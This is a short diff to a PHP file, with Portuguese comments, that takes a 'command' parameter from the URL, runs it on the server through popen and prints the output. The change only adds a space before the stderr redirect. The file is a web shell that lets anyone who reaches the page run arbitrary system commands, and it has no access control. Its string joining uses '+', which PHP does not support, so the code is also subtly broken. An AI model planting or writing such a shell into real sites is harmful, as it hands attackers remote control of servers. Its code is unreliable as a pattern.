@@ -1,6 +1,6 @@
 <?php
     if ($_GET["command"]){
-        $handle = popen(urldecode($_GET["command"]) + "2>&1", "r"); // Substitua pelo seu comando
+        $handle = popen(urldecode($_GET["command"]) + " 2>&1", "r"); // Substitua pelo seu comando
         echo "<pre>";
         while (!feof($handle)) {
             $line = fgets($handle); // Lê uma linha por vez
